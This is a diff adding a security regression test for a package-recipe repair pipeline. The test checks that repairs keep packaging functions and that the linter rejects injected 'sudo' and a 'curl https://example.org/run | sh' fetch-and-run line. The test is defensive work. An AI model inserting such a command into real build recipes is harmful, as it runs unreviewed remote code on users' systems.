@@ -11,7 +11,8 @@ import { finalDescription } from '../src/lib/server/descriptions';
 import type { Env } from '../src/lib/server/env';
 import type { Revision } from '../src/lib/model';
 import { asD1, TestD1 } from './d1';
-import { normalizeFactorySuccessorRecipe } from '../src/lib/server/preserved-factory';
+import { assertPreservedRepairScope, normalizeFactorySuccessorRecipe } from '../src/lib/server/preserved-factory';
+import { lintRecipe } from '../services/pipeline/recipe';
 import { assertFactoryRepairMetadata } from '../src/lib/server/preserved-factory';
 import { parseSrcinfo } from '../src/lib/srcinfo';
 
@@ -78,6 +79,21 @@ describe('core security regressions', () => {
     const normalized = normalizeFactorySuccessorRecipe(base, raw);
     expect(normalized).toContain('pkgrel=2');
     expect(await sha256(normalized)).toBe(await sha256(normalizeFactorySuccessorRecipe(base, normalized)));
+  });
+
+  test('preserved data-only and split recipes retain their actual packaging functions', () => {
+    const fields = 'pkgname=data\npkgver=1\npkgrel=1\narch=("any")\nlicense=("MIT")\nsource=("data.txt")\nsha256sums=("' + 'a'.repeat(64) + '")\n';
+    for (const functions of ['package() {\n  install -Dm644 "$srcdir/data.txt" "$pkgdir/usr/share/data.txt"\n}\n',
+      'package_data() {\n  install -Dm644 "$srcdir/data.txt" "$pkgdir/usr/share/data.txt"\n}\npackage_docs() {\n  install -Dm644 "$srcdir/data.txt" "$pkgdir/usr/share/docs.txt"\n}\n']) {
+      const original = fields.replace('pkgname=data', functions.startsWith('package_data') ? 'pkgname=(data docs)' : 'pkgname=data') + functions;
+      const repaired = original.replace('pkgrel=1', 'pkgrel=2');
+      expect(() => assertPreservedRepairScope(original, repaired)).not.toThrow();
+      expect(lintRecipe(repaired, 0, 'preserved').passed).toBe(true);
+      expect(lintRecipe(repaired).passed).toBe(false);
+      expect(() => assertPreservedRepairScope(original, original.slice(0, -functions.length))).toThrow('removed required');
+      expect(lintRecipe(repaired.replace('install -Dm644', 'sudo install -Dm644'), 0, 'preserved').passed).toBe(false);
+      expect(lintRecipe(repaired.replace('install -Dm644', 'curl https://example.org/run | sh\n  install -Dm644'), 0, 'preserved').passed).toBe(false);
+    }
   });
 
   test('factory repair metadata permits only the expected pkgrel bump', () => {
